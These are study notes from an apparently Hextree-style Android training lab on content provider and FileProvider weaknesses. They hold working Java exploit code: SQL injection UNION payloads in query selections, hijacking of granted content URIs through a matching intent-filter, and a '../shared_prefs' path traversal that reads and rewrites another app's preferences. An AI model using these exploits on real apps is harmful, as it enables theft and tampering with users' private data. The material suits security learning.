# Content & File Provider
- [Overview](#overview)
- [SQL Injection in Content Providers](#sql-injection-in-content-providers)
- [GRANT_READ_URI_PERMISSION](#grant_read_uri_permission)
- [Hijacking Content Provider Access](#hijacking-content-provider-access)
- [The AndroidX FileProvider](#the-androidx-fileprovider)
    - [How to Access FileProvider](#how-to-access-fileprovider)
    - [FileProvider Write Access](#fileprovider-write-access)



## Overview
- Content Providers are identified and accessed with a `content://` URI. 
- We can call it using adb `adb shell content query --uri CONTENT_URI`
- Using the `getContentResolver().query()` method the URI can be querried. The returned data is a table structure that can be explored using the Cursor object.

```java
Cursor cursor = getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI,
                null, null,
                null, null);
```

- Dump content provider:
```java
public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

> [!TIP]
> Always check for query(), update(),insert() and delete() function in content providers

> [!NOTE]
> Don't forget to add queries tag in AndroidManifest.xml
> ```xml
>    <queries>
>        <package android:name="io.hextree.attacksurface"/>
>    </queries>
> ```


## SQL Injection in Content Providers
- We can use the same dump method that we have used before and pass SQL queries in selection argument:
```java
    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, "1) UNION SELECT * FROM Flag WHERE visible=0 AND (1", null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```

## GRANT_READ_URI_PERMISSION
- Sharing access to Content Provider is a central feature of Android. It is used all the time to give other apps access, without giving direct file access. A typical <provider> looks like this:
```xml
<provider
    android:name=".providers.Flag33Provider1"
    android:authorities="io.hextree.flag33_1"
    android:enabled="true"
    android:exported="false"
    android:grantUriPermissions="true" />
```
- The provider is generally not exported with `android:exported="false"` but the attribute `android:grantUriPermissions="true"` is set. 
- This means the provider cannot be directly interacted with. But the app can allow another app to query the provider, when sending an Intent with a flag such as `GRANT_READ_URI_PERMISSION`.

- For example an app might start an Activity and expect a result. The target app can then share access to its content provider by returning such an Intent back to the caller class.
```java
intent.setData(Uri.parse("content://io.hextree.example/flags"));
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
setResult(RESULT_OK, intent);
```
- We can Inject into the provided Uri:
```java
        Button button = (Button) findViewById(R.id.click);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setAction("io.hextree.FLAG33");
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
                startActivityForResult(intent, 1); // 1 is the requestCode
            }
        });


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 1) { // Matching the requestCode
            if (resultCode == RESULT_OK) {
                dump(data.getData());
            }
        }

    }

    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, "1=1 UNION SELECT null, title, content, null FROM Note --", null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```

## Hijacking Content Provider Access

- Example class:
```java
Intent intent = new Intent();
intent.setAction("io.hextree.FLAG33");
intent.setData(Uri.parse("content://io.hextree.flag33_2/flags"));
intent.addFlags(1);
startActivity(intent);
```

- We can create another activity that handles the action and Uri, We should define it in AndroidManifes.xml:
```xml
<activity
    android:name=".Second_Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.FLAG33" />
        <category android:name="android.intent.category.DEFAULT" />
        <data
            android:scheme="content"
            android:host="io.hextree.flag33_2"
            android:path="/flags"/>
    </intent-filter>
</activity>
```
- Second_Activity.class
```java
Intent intent = getIntent();
dump(intent.getData());




    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, "_id=2 UNION SELECT 1, title, content, null FROM Note --", null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```
## The AndroidX FileProvider
- Android Jetpack (or androidx) is a commonly used official library implementing lots of useful classes. Including the widely used FileProvider.
- Such a provider can easily be identified in the Android manifest where it references the androidx.core.content.FileProvider name.
```xml
<provider android:name="androidx.core.content.FileProvider"
          android:exported="false" 
          android:authorities="io.hextree.files"
          android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" 
               android:resource="@xml/filepaths"/>
</provider>
```

- Notable is the referenced XML file filepaths.xml which contains the configuration for this FileProvider.
```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="flag_files" path="flags/"/>
    <files-path name="other_files" path="."/>
</paths>
```

- A typical URI generated for this FileProvider could look like this content://io.hextree.files/other_files/secret.txt. Where the sections can be read like so:

    - `content://` it's a content provider
    - `io.hextree.files` the authority from the android manifest
    - `other_files` which configuration entry is used
    - `/secret.txt` the path of the file relative to the configured path in the .xml file

### How To Access FileProvider
```java
// Vulnerable Class
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String stringExtra = getIntent().getStringExtra("filename");
        if (stringExtra != null) {
            prepareFlag(this, stringExtra);
            Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), stringExtra));
            Intent intent = new Intent();
            intent.setData(uriForFile);
            intent.addFlags(3);
            setResult(0, intent);
            return;
        }
        Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.files", new File(getFilesDir(), "secret.txt"));
        Intent intent2 = new Intent();
        intent2.setData(uriForFile2);
        intent2.addFlags(3);
        setResult(-1, intent2);
    }

```
- Read the flag:
```java
Button button = findViewById(R.id.click);
button.setOnClickListener(v -> {
    Intent intent = new Intent();
    intent.putExtra("filename", "flags/flag34.txt");
    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
    startActivityForResult(intent, 42);
});

    

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 42) { // Matching the requestCode
            try {
                InputStream inputStream = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;

                while ((line = reader.readLine()) != null) {
                    Log.d("File", line);
                }
            }
            catch (IOException e){
            }            
            
        }
    }
```

### Insecure root-path FileProvider Config
```java
// the same Vulnerable class
  public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String stringExtra = getIntent().getStringExtra("filename");
        if (stringExtra != null) {
            prepareFlag(this, stringExtra);
            Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.root", new File(getFilesDir(), stringExtra));
            Intent intent = new Intent();
            intent.setData(uriForFile);
            intent.addFlags(3);
            setResult(0, intent);
            return;
        }
        Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.root", new File(getFilesDir(), "secret.txt"));
        Intent intent2 = new Intent();
        intent2.setData(uriForFile2);
        intent2.addFlags(3);
        setResult(-1, intent2);
    }

```
- Compare the filepaths.xml to the rootpaths.xml file provider configuration. Why is the `<root-path>` considered "insecure"?

- filepaths.xml:
```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="flag_files" path="flags/"/>
    <files-path name="other_files" path="."/>
</paths>
```
- Remember that the file provider configuration is used to generate file sharing URIs such as `content://io.hextree.files/other_files/secret.txt`. 

- rootpaths.xml:
```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root_files" path="/"/>
</paths>
```
- The file provider with a `<root-path>` configuration will generated URIs like this `content://io.hextree.files/root_files/data/data/io.hextree.attacksurface/files/secret.txt`. If we decode these sections we can see that this provider can map files of the entire filesystem.

    - `content://` it's a content provider
    - `io.hextree.root` the authority from the android manifest
    - `root_files` which configuration entry is used
    - `/data/data/io.hextree.attacksurface/files/secret.txt` the path of the file relative to the configured path, which is mapped to the filesystem root!
- In itself the `<root-path>` configuration is not actually insecure, as long as only trusted files are shared. But if the app allows an attacker to control the path to any file, it can be used to expose arbitrary internal files.

### FileProvider Write Access
- Besides sharing content providers with read permissions, an app can also share write permissions
```java
// ...
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
```

> [!NOTE]
> In decompiled code the integer constants FLAG_GRANT_READ_URI_PERMISSION are probably directly referenced. Which means:
> `addFlags(1)` = FLAG_GRANT_READ_URI_PERMISSION
> `addFlags(2)` = FLAG_GRANT_WRITE_URI_PERMISSION
> `addFlags(3)` = both FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION

- We can exploit the same vulnerable class to access the shared preferences and edit them as follows:
```java
Button button = findViewById(R.id.click);
        button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
            startActivityForResult(intent, 42);
        });

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != 42 || data == null || data.getData() == null) return;

        Uri uri = data.getData();

        // 1) Read the whole file
        StringBuilder sb = new StringBuilder();
        try (InputStream in = getContentResolver().openInputStream(uri);
             BufferedReader br = new BufferedReader(new InputStreamReader(in))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append('\n');
        } catch (IOException e) {
            Log.e("Hextree", "Read failed", e);
            return;
        }

        // 2) Toggle the boolean
        String xml = sb.toString().replace("value=\"false\"", "value=\"true\"");

        // 3) Write it back — use "rwt" to truncate/replace
        try (OutputStream out = getContentResolver().openOutputStream(uri, "rwt")) {
            if (out == null) throw new IOException("openOutputStream returned null");
            out.write(xml.getBytes(StandardCharsets.UTF_8));
            out.flush();
            Toast.makeText(this, "Flag updated", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            Log.e("Hextree", "Write failed", e);
        }
    }
```

## Resources
- [Oversecured - Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
- [Oversecured - Android security checklist: Content Providers](https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/)